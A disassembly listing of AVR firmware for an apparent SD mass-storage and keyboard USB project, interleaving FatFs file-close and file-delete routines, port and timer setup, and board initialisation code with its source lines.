    3558:	66 8d       	ldd	r22, Z+30	; 0x1e
    355a:	77 8d       	ldd	r23, Z+31	; 0x1f
    355c:	89 81       	ldd	r24, Y+1	; 0x01
    355e:	9a 81       	ldd	r25, Y+2	; 0x02
    3560:	0e 94 68 08 	call	0x10d0	; 0x10d0 <move_window>
    3564:	81 11       	cpse	r24, r1
    3566:	30 c0       	rjmp	.+96     	; 0x35c8 <f_sync+0xb0>
    3568:	f8 01       	movw	r30, r16
    356a:	e0 a0       	ldd	r14, Z+32	; 0x20
    356c:	f1 a0       	ldd	r15, Z+33	; 0x21
    356e:	f7 01       	movw	r30, r14
    3570:	83 85       	ldd	r24, Z+11	; 0x0b
    3572:	80 62       	ori	r24, 0x20	; 32
    3574:	83 87       	std	Z+11, r24	; 0x0b
    3576:	f8 01       	movw	r30, r16
    3578:	26 81       	ldd	r18, Z+6	; 0x06
    357a:	37 81       	ldd	r19, Z+7	; 0x07
    357c:	40 85       	ldd	r20, Z+8	; 0x08
    357e:	51 85       	ldd	r21, Z+9	; 0x09
    3580:	b7 01       	movw	r22, r14
    3582:	80 81       	ld	r24, Z
    3584:	91 81       	ldd	r25, Z+1	; 0x01
    3586:	0e 94 81 07 	call	0xf02	; 0xf02 <st_clust>
    358a:	f8 01       	movw	r30, r16
    358c:	42 85       	ldd	r20, Z+10	; 0x0a
    358e:	53 85       	ldd	r21, Z+11	; 0x0b
    3590:	64 85       	ldd	r22, Z+12	; 0x0c
    3592:	75 85       	ldd	r23, Z+13	; 0x0d
    3594:	c7 01       	movw	r24, r14
    3596:	4c 96       	adiw	r24, 0x1c	; 28
    3598:	0e 94 f2 06 	call	0xde4	; 0xde4 <st_dword>
    359c:	b5 01       	movw	r22, r10
    359e:	a4 01       	movw	r20, r8
    35a0:	c7 01       	movw	r24, r14
    35a2:	46 96       	adiw	r24, 0x16	; 22
    35a4:	0e 94 f2 06 	call	0xde4	; 0xde4 <st_dword>
    35a8:	60 e0       	ldi	r22, 0x00	; 0
    35aa:	70 e0       	ldi	r23, 0x00	; 0
    35ac:	c7 01       	movw	r24, r14
    35ae:	42 96       	adiw	r24, 0x12	; 18
    35b0:	0e 94 ee 06 	call	0xddc	; 0xddc <st_word>
    35b4:	89 81       	ldd	r24, Y+1	; 0x01
    35b6:	9a 81       	ldd	r25, Y+2	; 0x02
    35b8:	21 e0       	ldi	r18, 0x01	; 1
    35ba:	fc 01       	movw	r30, r24
    35bc:	23 83       	std	Z+3, r18	; 0x03
    35be:	14 da       	rcall	.-3032   	; 0x29e8 <sync_fs>
    35c0:	f8 01       	movw	r30, r16
    35c2:	96 85       	ldd	r25, Z+14	; 0x0e
    35c4:	9f 7b       	andi	r25, 0xBF	; 191
    35c6:	96 87       	std	Z+14, r25	; 0x0e
    35c8:	0f 90       	pop	r0
    35ca:	0f 90       	pop	r0
    35cc:	df 91       	pop	r29
    35ce:	cf 91       	pop	r28
    35d0:	1f 91       	pop	r17
    35d2:	0f 91       	pop	r16
    35d4:	ff 90       	pop	r15
    35d6:	ef 90       	pop	r14
    35d8:	bf 90       	pop	r11
    35da:	af 90       	pop	r10
    35dc:	9f 90       	pop	r9
    35de:	8f 90       	pop	r8
    35e0:	08 95       	ret

000035e2 <f_close>:
    35e2:	0f 93       	push	r16
    35e4:	1f 93       	push	r17
    35e6:	cf 93       	push	r28
    35e8:	df 93       	push	r29
    35ea:	00 d0       	rcall	.+0      	; 0x35ec <f_close+0xa>
    35ec:	cd b7       	in	r28, 0x3d	; 61
    35ee:	de b7       	in	r29, 0x3e	; 62
    35f0:	8c 01       	movw	r16, r24
    35f2:	92 df       	rcall	.-220    	; 0x3518 <f_sync>
    35f4:	81 11       	cpse	r24, r1
    35f6:	0b c0       	rjmp	.+22     	; 0x360e <f_close+0x2c>
    35f8:	be 01       	movw	r22, r28
    35fa:	6f 5f       	subi	r22, 0xFF	; 255
    35fc:	7f 4f       	sbci	r23, 0xFF	; 255
    35fe:	c8 01       	movw	r24, r16
    3600:	0e 94 dc 07 	call	0xfb8	; 0xfb8 <validate>
    3604:	81 11       	cpse	r24, r1
    3606:	03 c0       	rjmp	.+6      	; 0x360e <f_close+0x2c>
    3608:	f8 01       	movw	r30, r16
    360a:	11 82       	std	Z+1, r1	; 0x01
    360c:	10 82       	st	Z, r1
    360e:	0f 90       	pop	r0
    3610:	0f 90       	pop	r0
    3612:	df 91       	pop	r29
    3614:	cf 91       	pop	r28
    3616:	1f 91       	pop	r17
    3618:	0f 91       	pop	r16
    361a:	08 95       	ret

0000361c <f_unlink>:
/*-----------------------------------------------------------------------*/

FRESULT f_unlink (
	const TCHAR* path		/* Pointer to the file or directory path */
)
{
    361c:	af 92       	push	r10
    361e:	bf 92       	push	r11
    3620:	cf 92       	push	r12
    3622:	df 92       	push	r13
    3624:	ef 92       	push	r14
    3626:	ff 92       	push	r15
    3628:	0f 93       	push	r16
    362a:	1f 93       	push	r17
    362c:	cf 93       	push	r28
    362e:	df 93       	push	r29
    3630:	cd b7       	in	r28, 0x3d	; 61
    3632:	de b7       	in	r29, 0x3e	; 62
    3634:	c4 55       	subi	r28, 0x54	; 84
    3636:	d1 09       	sbc	r29, r1
    3638:	0f b6       	in	r0, 0x3f	; 63
    363a:	f8 94       	cli
    363c:	de bf       	out	0x3e, r29	; 62
    363e:	0f be       	out	0x3f, r0	; 63
    3640:	cd bf       	out	0x3d, r28	; 61
    3642:	65 96       	adiw	r28, 0x15	; 21
    3644:	9f af       	std	Y+63, r25	; 0x3f
    3646:	8e af       	std	Y+62, r24	; 0x3e
    3648:	65 97       	sbiw	r28, 0x15	; 21
#endif
	DEF_NAMBUF


	/* Get logical drive */
	res = mount_volume(&path, &fs, FA_WRITE);
    364a:	42 e0       	ldi	r20, 0x02	; 2
    364c:	be 01       	movw	r22, r28
    364e:	6f 5a       	subi	r22, 0xAF	; 175
    3650:	7f 4f       	sbci	r23, 0xFF	; 255
    3652:	ce 01       	movw	r24, r28
    3654:	8d 5a       	subi	r24, 0xAD	; 173
    3656:	9f 4f       	sbci	r25, 0xFF	; 255
    3658:	0e 94 bd 09 	call	0x137a	; 0x137a <mount_volume>
    365c:	18 2f       	mov	r17, r24
	if (res == FR_OK) {
    365e:	81 11       	cpse	r24, r1
    3660:	7b c0       	rjmp	.+246    	; 0x3758 <f_unlink+0x13c>
		dj.obj.fs = fs;
    3662:	63 96       	adiw	r28, 0x13	; 19
    3664:	8e ad       	ldd	r24, Y+62	; 0x3e
    3666:	9f ad       	ldd	r25, Y+63	; 0x3f
    3668:	63 97       	sbiw	r28, 0x13	; 19
    366a:	9a 83       	std	Y+2, r25	; 0x02
    366c:	89 83       	std	Y+1, r24	; 0x01
		INIT_NAMBUF(fs);
		res = follow_path(&dj, path);		/* Follow the file path */
    366e:	65 96       	adiw	r28, 0x15	; 21
    3670:	6e ad       	ldd	r22, Y+62	; 0x3e
    3672:	7f ad       	ldd	r23, Y+63	; 0x3f
    3674:	65 97       	sbiw	r28, 0x15	; 21
    3676:	ce 01       	movw	r24, r28
    3678:	01 96       	adiw	r24, 0x01	; 1
    367a:	f7 d8       	rcall	.-3602   	; 0x286a <follow_path>
    367c:	18 2f       	mov	r17, r24
		if (FF_FS_RPATH && res == FR_OK && (dj.fn[NSFLAG] & NS_DOT)) {
    367e:	81 11       	cpse	r24, r1
    3680:	03 c0       	rjmp	.+6      	; 0x3688 <f_unlink+0x6c>
    3682:	88 a5       	ldd	r24, Y+40	; 0x28
    3684:	85 fd       	sbrc	r24, 5
			res = FR_INVALID_NAME;			/* Cannot remove dot entry */
    3686:	16 e0       	ldi	r17, 0x06	; 6
		}
#if FF_FS_LOCK != 0
		if (res == FR_OK) res = chk_lock(&dj, 2);	/* Check if it is an open object */
#endif
		if (res == FR_OK) {					/* The object is accessible */
    3688:	11 11       	cpse	r17, r1
    368a:	66 c0       	rjmp	.+204    	; 0x3758 <f_unlink+0x13c>
			if (dj.fn[NSFLAG] & NS_NONAME) {
    368c:	88 a5       	ldd	r24, Y+40	; 0x28
    368e:	88 23       	and	r24, r24
    3690:	24 f0       	brlt	.+8      	; 0x369a <f_unlink+0x7e>
				res = FR_INVALID_NAME;		/* Cannot remove the origin directory */
			} else {
				if (dj.obj.attr & AM_RDO) {
    3692:	8d 81       	ldd	r24, Y+5	; 0x05
    3694:	80 fd       	sbrc	r24, 0
    3696:	03 c0       	rjmp	.+6      	; 0x369e <f_unlink+0x82>
    3698:	03 c0       	rjmp	.+6      	; 0x36a0 <f_unlink+0x84>
#if FF_FS_LOCK != 0
		if (res == FR_OK) res = chk_lock(&dj, 2);	/* Check if it is an open object */
#endif
		if (res == FR_OK) {					/* The object is accessible */
			if (dj.fn[NSFLAG] & NS_NONAME) {
				res = FR_INVALID_NAME;		/* Cannot remove the origin directory */
    369a:	16 e0       	ldi	r17, 0x06	; 6
    369c:	01 c0       	rjmp	.+2      	; 0x36a0 <f_unlink+0x84>
			} else {
				if (dj.obj.attr & AM_RDO) {
					res = FR_DENIED;		/* Cannot remove R/O object */
    369e:	17 e0       	ldi	r17, 0x07	; 7
				}
			}
			if (res == FR_OK) {
    36a0:	11 11       	cpse	r17, r1
    36a2:	35 c0       	rjmp	.+106    	; 0x370e <f_unlink+0xf2>
					init_alloc_info(fs, &obj);
					dclst = obj.sclust;
				} else
#endif
				{
					dclst = ld_clust(fs, dj.dir);
    36a4:	6b 8d       	ldd	r22, Y+27	; 0x1b
    36a6:	7c 8d       	ldd	r23, Y+28	; 0x1c
    36a8:	63 96       	adiw	r28, 0x13	; 19
    36aa:	ae ac       	ldd	r10, Y+62	; 0x3e
    36ac:	bf ac       	ldd	r11, Y+63	; 0x3f
    36ae:	63 97       	sbiw	r28, 0x13	; 19
    36b0:	c5 01       	movw	r24, r10
    36b2:	0e 94 56 07 	call	0xeac	; 0xeac <ld_clust>
    36b6:	6b 01       	movw	r12, r22
    36b8:	7c 01       	movw	r14, r24
				}
				if (dj.obj.attr & AM_DIR) {			/* Is it a sub-directory? */
    36ba:	8d 81       	ldd	r24, Y+5	; 0x05
    36bc:	84 ff       	sbrs	r24, 4
    36be:	2c c0       	rjmp	.+88     	; 0x3718 <f_unlink+0xfc>
#if FF_FS_RPATH != 0
					if (dclst == fs->cdir) {	 	/* Is it the current directory? */
    36c0:	f5 01       	movw	r30, r10
    36c2:	83 89       	ldd	r24, Z+19	; 0x13
    36c4:	94 89       	ldd	r25, Z+20	; 0x14
    36c6:	a5 89       	ldd	r26, Z+21	; 0x15
    36c8:	b6 89       	ldd	r27, Z+22	; 0x16
    36ca:	c8 16       	cp	r12, r24
    36cc:	d9 06       	cpc	r13, r25
    36ce:	ea 06       	cpc	r14, r26
    36d0:	fb 06       	cpc	r15, r27
    36d2:	09 f1       	breq	.+66     	; 0x3716 <f_unlink+0xfa>
						res = FR_DENIED;
					} else
#endif
					{
						sdj.obj.fs = fs;			/* Open the sub-directory */
    36d4:	ba a6       	std	Y+42, r11	; 0x2a
    36d6:	a9 a6       	std	Y+41, r10	; 0x29
						sdj.obj.sclust = dclst;
    36d8:	cf a6       	std	Y+47, r12	; 0x2f
    36da:	d8 aa       	std	Y+48, r13	; 0x30
    36dc:	e9 aa       	std	Y+49, r14	; 0x31
    36de:	fa aa       	std	Y+50, r15	; 0x32
						if (fs->fs_type == FS_EXFAT) {
							sdj.obj.objsize = obj.objsize;
							sdj.obj.stat = obj.stat;
						}
#endif
						res = dir_sdi(&sdj, 0);
    36e0:	40 e0       	ldi	r20, 0x00	; 0
    36e2:	50 e0       	ldi	r21, 0x00	; 0
    36e4:	ba 01       	movw	r22, r20
    36e6:	ce 01       	movw	r24, r28
    36e8:	89 96       	adiw	r24, 0x29	; 41
    36ea:	0e 94 39 0e 	call	0x1c72	; 0x1c72 <dir_sdi>
    36ee:	18 2f       	mov	r17, r24
						if (res == FR_OK) {
    36f0:	81 11       	cpse	r24, r1
    36f2:	12 c0       	rjmp	.+36     	; 0x3718 <f_unlink+0xfc>
							res = DIR_READ_FILE(&sdj);			/* Test if the directory is empty */
    36f4:	60 e0       	ldi	r22, 0x00	; 0
    36f6:	70 e0       	ldi	r23, 0x00	; 0
    36f8:	ce 01       	movw	r24, r28
    36fa:	89 96       	adiw	r24, 0x29	; 41
    36fc:	0e 94 e6 12 	call	0x25cc	; 0x25cc <dir_read>
							if (res == FR_OK) res = FR_DENIED;	/* Not empty? */
    3700:	81 11       	cpse	r24, r1
    3702:	01 c0       	rjmp	.+2      	; 0x3706 <f_unlink+0xea>
    3704:	87 e0       	ldi	r24, 0x07	; 7
							if (res == FR_NO_FILE) res = FR_OK;	/* Empty? */
    3706:	84 30       	cpi	r24, 0x04	; 4
    3708:	39 f0       	breq	.+14     	; 0x3718 <f_unlink+0xfc>
    370a:	18 2f       	mov	r17, r24
    370c:	05 c0       	rjmp	.+10     	; 0x3718 <f_unlink+0xfc>
	const TCHAR* path		/* Pointer to the file or directory path */
)
{
	FRESULT res;
	DIR dj, sdj;
	DWORD dclst = 0;
    370e:	c1 2c       	mov	r12, r1
    3710:	d1 2c       	mov	r13, r1
    3712:	76 01       	movw	r14, r12
    3714:	01 c0       	rjmp	.+2      	; 0x3718 <f_unlink+0xfc>
					dclst = ld_clust(fs, dj.dir);
				}
				if (dj.obj.attr & AM_DIR) {			/* Is it a sub-directory? */
#if FF_FS_RPATH != 0
					if (dclst == fs->cdir) {	 	/* Is it the current directory? */
						res = FR_DENIED;
    3716:	17 e0       	ldi	r17, 0x07	; 7
							if (res == FR_NO_FILE) res = FR_OK;	/* Empty? */
						}
					}
				}
			}
			if (res == FR_OK) {
    3718:	11 11       	cpse	r17, r1
    371a:	1e c0       	rjmp	.+60     	; 0x3758 <f_unlink+0x13c>
				res = dir_remove(&dj);			/* Remove the directory entry */
    371c:	ce 01       	movw	r24, r28
    371e:	01 96       	adiw	r24, 0x01	; 1
    3720:	0e 94 fb 10 	call	0x21f6	; 0x21f6 <dir_remove>
    3724:	18 2f       	mov	r17, r24
				if (res == FR_OK && dclst != 0) {	/* Remove the cluster chain if exist */
    3726:	81 11       	cpse	r24, r1
    3728:	0f c0       	rjmp	.+30     	; 0x3748 <f_unlink+0x12c>
    372a:	c1 14       	cp	r12, r1
    372c:	d1 04       	cpc	r13, r1
    372e:	e1 04       	cpc	r14, r1
    3730:	f1 04       	cpc	r15, r1
    3732:	51 f0       	breq	.+20     	; 0x3748 <f_unlink+0x12c>
#if FF_FS_EXFAT
					res = remove_chain(&obj, dclst, 0);
#else
					res = remove_chain(&dj.obj, dclst, 0);
    3734:	00 e0       	ldi	r16, 0x00	; 0
    3736:	10 e0       	ldi	r17, 0x00	; 0
    3738:	98 01       	movw	r18, r16
    373a:	b7 01       	movw	r22, r14
    373c:	a6 01       	movw	r20, r12
    373e:	ce 01       	movw	r24, r28
    3740:	01 96       	adiw	r24, 0x01	; 1
    3742:	0e 94 69 10 	call	0x20d2	; 0x20d2 <remove_chain>
    3746:	18 2f       	mov	r17, r24
#endif
				}
				if (res == FR_OK) res = sync_fs(fs);
    3748:	11 11       	cpse	r17, r1
    374a:	06 c0       	rjmp	.+12     	; 0x3758 <f_unlink+0x13c>
    374c:	63 96       	adiw	r28, 0x13	; 19
    374e:	8e ad       	ldd	r24, Y+62	; 0x3e
    3750:	9f ad       	ldd	r25, Y+63	; 0x3f
    3752:	63 97       	sbiw	r28, 0x13	; 19
    3754:	49 d9       	rcall	.-3438   	; 0x29e8 <sync_fs>
    3756:	18 2f       	mov	r17, r24
		}
		FREE_NAMBUF();
	}

	LEAVE_FF(fs, res);
}
    3758:	81 2f       	mov	r24, r17
    375a:	cc 5a       	subi	r28, 0xAC	; 172
    375c:	df 4f       	sbci	r29, 0xFF	; 255
    375e:	0f b6       	in	r0, 0x3f	; 63
    3760:	f8 94       	cli
    3762:	de bf       	out	0x3e, r29	; 62
    3764:	0f be       	out	0x3f, r0	; 63
    3766:	cd bf       	out	0x3d, r28	; 61
    3768:	df 91       	pop	r29
    376a:	cf 91       	pop	r28
    376c:	1f 91       	pop	r17
    376e:	0f 91       	pop	r16
    3770:	ff 90       	pop	r15
    3772:	ef 90       	pop	r14
    3774:	df 90       	pop	r13
    3776:	cf 90       	pop	r12
    3778:	bf 90       	pop	r11
    377a:	af 90       	pop	r10
    377c:	08 95       	ret

0000377e <mioinit>:
{
    //MCUCR = _BV(JTD); MCUCR = _BV(JTD);   /* Disable JTAG */

    //pull up

    PORTA = 0b11111111;
    377e:	8f ef       	ldi	r24, 0xFF	; 255
    3780:	82 b9       	out	0x02, r24	; 2
    PORTB = 0b11111111;
    3782:	85 b9       	out	0x05, r24	; 5
    PORTC = 0b11111111;
    3784:	88 b9       	out	0x08, r24	; 8
    PORTD = 0b11111111;
    3786:	8b b9       	out	0x0b, r24	; 11
    //PORTE = 0b11111111;
    PORTF = 0b11111111;
    3788:	81 bb       	out	0x11, r24	; 17
    //PORTG = 0b00011111;

#ifdef USE_TIMER3_FATFS
    // TIMER3
    TCCR3A = 0;
    378a:	10 92 90 00 	sts	0x0090, r1	; 0x800090 <__TEXT_REGION_LENGTH__+0x7e0090>
    TCCR3B = 0;
    378e:	e1 e9       	ldi	r30, 0x91	; 145
    3790:	f0 e0       	ldi	r31, 0x00	; 0
    3792:	10 82       	st	Z, r1
    TCCR3B |= (1 << WGM32);   //CTC mode; clock timer comare
    3794:	80 81       	ld	r24, Z
    3796:	88 60       	ori	r24, 0x08	; 8
    3798:	80 83       	st	Z, r24
    TIMSK3 |= (1 << OCIE3A); //ENABLE INTERUPTs
    379a:	a1 e7       	ldi	r26, 0x71	; 113
    379c:	b0 e0       	ldi	r27, 0x00	; 0
    379e:	8c 91       	ld	r24, X
    37a0:	82 60       	ori	r24, 0x02	; 2
    37a2:	8c 93       	st	X, r24
    OCR3A = 0x4E20;
    37a4:	80 e2       	ldi	r24, 0x20	; 32
    37a6:	9e e4       	ldi	r25, 0x4E	; 78
    37a8:	90 93 99 00 	sts	0x0099, r25	; 0x800099 <__TEXT_REGION_LENGTH__+0x7e0099>
    37ac:	80 93 98 00 	sts	0x0098, r24	; 0x800098 <__TEXT_REGION_LENGTH__+0x7e0098>
    TCCR3B |=  (1 << CS31); //PRESCALER
    37b0:	80 81       	ld	r24, Z
    37b2:	82 60       	ori	r24, 0x02	; 2
    37b4:	80 83       	st	Z, r24
    TIMSK1 |= (1 << OCIE1A); //ENABLE INTERUPTs
    OCR1A = 0x4E20;
    TCCR1B |=  (1 << CS11); //PRESCALER
#endif

    sei();
    37b6:	78 94       	sei
    37b8:	08 95       	ret

000037ba <__vector_32>:
}

#ifdef USE_TIMER3_FATFS
// TIMER3
ISR(TIMER3_COMPA_vect)
{
    37ba:	1f 92       	push	r1
    37bc:	0f 92       	push	r0
    37be:	0f b6       	in	r0, 0x3f	; 63
    37c0:	0f 92       	push	r0
    37c2:	11 24       	eor	r1, r1
    37c4:	0b b6       	in	r0, 0x3b	; 59
    37c6:	0f 92       	push	r0
    37c8:	2f 93       	push	r18
    37ca:	3f 93       	push	r19
    37cc:	4f 93       	push	r20
    37ce:	5f 93       	push	r21
    37d0:	6f 93       	push	r22
    37d2:	7f 93       	push	r23
    37d4:	8f 93       	push	r24
    37d6:	9f 93       	push	r25
    37d8:	af 93       	push	r26
    37da:	bf 93       	push	r27
    37dc:	ef 93       	push	r30
    37de:	ff 93       	push	r31
    Timer++;            /* Performance counter for this module */
    37e0:	80 91 89 09 	lds	r24, 0x0989	; 0x800989 <Timer>
    37e4:	90 91 8a 09 	lds	r25, 0x098A	; 0x80098a <Timer+0x1>
    37e8:	01 96       	adiw	r24, 0x01	; 1
    37ea:	90 93 8a 09 	sts	0x098A, r25	; 0x80098a <Timer+0x1>
    37ee:	80 93 89 09 	sts	0x0989, r24	; 0x800989 <Timer>
    disk_timerproc();   /* Drive timer procedure of low level disk I/O module */
    37f2:	0e 94 c6 06 	call	0xd8c	; 0xd8c <disk_timerproc>
}
    37f6:	ff 91       	pop	r31
    37f8:	ef 91       	pop	r30
    37fa:	bf 91       	pop	r27
    37fc:	af 91       	pop	r26
    37fe:	9f 91       	pop	r25
    3800:	8f 91       	pop	r24
    3802:	7f 91       	pop	r23
    3804:	6f 91       	pop	r22
    3806:	5f 91       	pop	r21
    3808:	4f 91       	pop	r20
    380a:	3f 91       	pop	r19
    380c:	2f 91       	pop	r18
    380e:	0f 90       	pop	r0
    3810:	0b be       	out	0x3b, r0	; 59
    3812:	0f 90       	pop	r0
    3814:	0f be       	out	0x3f, r0	; 63
    3816:	0f 90       	pop	r0
    3818:	1f 90       	pop	r1
    381a:	18 95       	reti

0000381c <SetupHardware>:

#include "at90lib.h"

/** Configures the board hardware and chip peripherals for the demo's functionality. */
void SetupHardware(void)
{
    381c:	1f 93       	push	r17
    381e:	cf 93       	push	r28
    3820:	df 93       	push	r29
    3822:	cd b7       	in	r28, 0x3d	; 61
    3824:	de b7       	in	r29, 0x3e	; 62
    3826:	c8 54       	subi	r28, 0x48	; 72
    3828:	d1 09       	sbc	r29, r1
    382a:	0f b6       	in	r0, 0x3f	; 63
    382c:	f8 94       	cli
    382e:	de bf       	out	0x3e, r29	; 62
    3830:	0f be       	out	0x3f, r0	; 63
    3832:	cd bf       	out	0x3d, r28	; 61
    /* Disable watchdog if enabled by bootloader/fuses */
    MCUSR &= ~(1 << WDRF);
    3834:	84 b7       	in	r24, 0x34	; 52
    3836:	87 7f       	andi	r24, 0xF7	; 247
    3838:	84 bf       	out	0x34, r24	; 52
		);
	}
	else
	{
        uint8_t register temp_reg;
		__asm__ __volatile__ (
    383a:	0f b6       	in	r0, 0x3f	; 63
    383c:	f8 94       	cli
    383e:	a8 95       	wdr
    3840:	80 91 60 00 	lds	r24, 0x0060	; 0x800060 <__TEXT_REGION_LENGTH__+0x7e0060>
    3844:	88 61       	ori	r24, 0x18	; 24
    3846:	80 93 60 00 	sts	0x0060, r24	; 0x800060 <__TEXT_REGION_LENGTH__+0x7e0060>
    384a:	10 92 60 00 	sts	0x0060, r1	; 0x800060 <__TEXT_REGION_LENGTH__+0x7e0060>
    384e:	0f be       	out	0x3f, r0	; 63
from 1 to 129. Thus, one does not need to use \c clock_div_t type as argument.
*/
void clock_prescale_set(clock_div_t __x)
{
    uint8_t __tmp = _BV(CLKPCE);
    __asm__ __volatile__ (
    3850:	90 e0       	ldi	r25, 0x00	; 0
    3852:	80 e8       	ldi	r24, 0x80	; 128
    3854:	0f b6       	in	r0, 0x3f	; 63
    3856:	f8 94       	cli
    3858:	80 93 61 00 	sts	0x0061, r24	; 0x800061 <__TEXT_REGION_LENGTH__+0x7e0061>
    385c:	90 93 61 00 	sts	0x0061, r25	; 0x800061 <__TEXT_REGION_LENGTH__+0x7e0061>
    3860:	0f be       	out	0x3f, r0	; 63
	#else
		//round up by default
		__ticks_dc = (uint32_t)(ceil(fabs(__tmp)));
	#endif

	__builtin_avr_delay_cycles(__ticks_dc);
    3862:	2f ef       	ldi	r18, 0xFF	; 255
    3864:	33 ed       	ldi	r19, 0xD3	; 211
    3866:	40 e3       	ldi	r20, 0x30	; 48
    3868:	21 50       	subi	r18, 0x01	; 1
    386a:	30 40       	sbci	r19, 0x00	; 0
    386c:	40 40       	sbci	r20, 0x00	; 0
    386e:	e1 f7       	brne	.-8      	; 0x3868 <SetupHardware+0x4c>
    3870:	00 c0       	rjmp	.+0      	; 0x3872 <SetupHardware+0x56>
    3872:	00 00       	nop
    /* Disable clock division */
    clock_prescale_set(clock_div_1);

    _delay_ms(1000);

    ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    3874:	1f b7       	in	r17, 0x3f	; 63
    return 1;
}

static __inline__ uint8_t __iCliRetVal(void)
{
    cli();
    3876:	f8 94       	cli
    3878:	81 e0       	ldi	r24, 0x01	; 1
    387a:	05 c0       	rjmp	.+10     	; 0x3886 <SetupHardware+0x6a>
    {
        eepr_boot();
    387c:	0e 94 94 03 	call	0x728	; 0x728 <eepr_boot>
        save_eepr();
    3880:	0e 94 6d 03 	call	0x6da	; 0x6da <save_eepr>
    /* Disable clock division */
    clock_prescale_set(clock_div_1);

    _delay_ms(1000);

    ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    3884:	80 e0       	ldi	r24, 0x00	; 0
    3886:	81 11       	cpse	r24, r1
    3888:	f9 cf       	rjmp	.-14     	; 0x387c <SetupHardware+0x60>
    (void)__s;
}

static __inline__ void __iRestore(const  uint8_t *__s)
{
    SREG = *__s;
    388a:	1f bf       	out	0x3f, r17	; 63
        save_eepr();
    }


    /* Hardware Initialization */
    mioinit();
    388c:	78 df       	rcall	.-272    	; 0x377e <mioinit>
			static inline void Serial_Init(const uint32_t BaudRate,
			                               const bool DoubleSpeed);
			static inline void Serial_Init(const uint32_t BaudRate,
			                               const bool DoubleSpeed)
			{
				UBRR1  = (DoubleSpeed ? SERIAL_2X_UBBRVAL(BaudRate) : SERIAL_UBBRVAL(BaudRate));
    388e:	87 e6       	ldi	r24, 0x67	; 103
    3890:	90 e0       	ldi	r25, 0x00	; 0
    3892:	90 93 cd 00 	sts	0x00CD, r25	; 0x8000cd <__TEXT_REGION_LENGTH__+0x7e00cd>
    3896:	80 93 cc 00 	sts	0x00CC, r24	; 0x8000cc <__TEXT_REGION_LENGTH__+0x7e00cc>

				UCSR1C = ((1 << UCSZ11) | (1 << UCSZ10));
    389a:	86 e0       	ldi	r24, 0x06	; 6
    389c:	80 93 ca 00 	sts	0x00CA, r24	; 0x8000ca <__TEXT_REGION_LENGTH__+0x7e00ca>
				UCSR1A = (DoubleSpeed ? (1 << U2X1) : 0);
    38a0:	10 92 c8 00 	sts	0x00C8, r1	; 0x8000c8 <__TEXT_REGION_LENGTH__+0x7e00c8>
				UCSR1B = ((1 << TXEN1)  | (1 << RXEN1));
    38a4:	88 e1       	ldi	r24, 0x18	; 24
    38a6:	80 93 c9 00 	sts	0x00C9, r24	; 0x8000c9 <__TEXT_REGION_LENGTH__+0x7e00c9>

				DDRD  |= (1 << 3);
    38aa:	8a b1       	in	r24, 0x0a	; 10
    38ac:	88 60       	ori	r24, 0x08	; 8
    38ae:	8a b9       	out	0x0a, r24	; 10
				PORTD |= (1 << 2);
    38b0:	8b b1       	in	r24, 0x0b	; 11
    38b2:	84 60       	ori	r24, 0x04	; 4
    38b4:	8b b9       	out	0x0b, r24	; 11

    Serial_Init(9600, false);
    Serial_SendString("\r\n\r\nSetup mass storage sd and keyboard by David Reguera Garcia aka Dreg - MIT License\r\ndreg@fr33project.org\r\nhttps://github.com/therealdreg\r\n");
    38b6:	85 ef       	ldi	r24, 0xF5	; 245
    38b8:	93 e0       	ldi	r25, 0x03	; 3
    38ba:	0e 94 d6 2e 	call	0x5dac	; 0x5dac <Serial_SendString>
    Serial_CreateStream(NULL);
    38be:	80 e0       	ldi	r24, 0x00	; 0
    38c0:	90 e0       	ldi	r25, 0x00	; 0
    38c2:	0e 94 f7 2e 	call	0x5dee	; 0x5dee <Serial_CreateStream>
    printf("https://www.rootkit.es\r\n");
    38c6:	83 e8       	ldi	r24, 0x83	; 131
    38c8:	94 e0       	ldi	r25, 0x04	; 4
    38ca:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
    printf_P(PSTR("https://www.fr33project.org\r\npowered by LUFA http://elm-chan.org/fsw/ff/00index_e.html and FatFs http://elm-chan.org/fsw/ff/00index_e.html\r\n\r\n"));
    38ce:	8b ec       	ldi	r24, 0xCB	; 203
    38d0:	91 e0       	ldi	r25, 0x01	; 1
    38d2:	9f 93       	push	r25
    38d4:	8f 93       	push	r24
    38d6:	0e 94 5d 39 	call	0x72ba	; 0x72ba <printf_P>

    init_xmem();
    38da:	0e 94 ca 01 	call	0x394	; 0x394 <init_xmem>
    set_bank(0);
    38de:	80 e0       	ldi	r24, 0x00	; 0
    38e0:	0e 94 c4 01 	call	0x388	; 0x388 <set_bank>
    ((uint8_t*)XMEM_START)[0x69] = 0;
    ((uint8_t*)XMEM_START)[0x69] = 0x69;
    38e4:	89 e6       	ldi	r24, 0x69	; 105
    38e6:	80 93 69 22 	sts	0x2269, r24	; 0x802269 <_end+0x1463>
    if (((uint8_t*)XMEM_START)[0x69] == 0x69)
    {
        printf("\r\nexternal memory is working good\r\n");
    38ea:	8b e9       	ldi	r24, 0x9B	; 155
    38ec:	94 e0       	ldi	r25, 0x04	; 4
    38ee:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
    else
    {
        printf("\r\nERROR! external memory is not working\r\n");
    }

    if (eppr_vars.curr_stage == STAG_1)
    38f2:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
    38f6:	0f 90       	pop	r0
    38f8:	0f 90       	pop	r0
    38fa:	81 11       	cpse	r24, r1
    38fc:	1d c0       	rjmp	.+58     	; 0x3938 <SetupHardware+0x11c>
    {
        CMD_t cmd = { .cmd = PRLE_CMD_AM_I_IN_STAGE2 };
    38fe:	ce 01       	movw	r24, r28
    3900:	01 96       	adiw	r24, 0x01	; 1
    3902:	28 e4       	ldi	r18, 0x48	; 72
    3904:	fc 01       	movw	r30, r24
    3906:	11 92       	st	Z+, r1
    3908:	2a 95       	dec	r18
    390a:	e9 f7       	brne	.-6      	; 0x3906 <SetupHardware+0xea>
    390c:	22 e7       	ldi	r18, 0x72	; 114
    390e:	33 e0       	ldi	r19, 0x03	; 3
    3910:	3a 83       	std	Y+2, r19	; 0x02
    3912:	29 83       	std	Y+1, r18	; 0x01
        if (send_cmd(&cmd, NULL))
    3914:	60 e0       	ldi	r22, 0x00	; 0
    3916:	70 e0       	ldi	r23, 0x00	; 0
    3918:	0e 94 e4 05 	call	0xbc8	; 0xbc8 <send_cmd>
    391c:	89 2b       	or	r24, r25
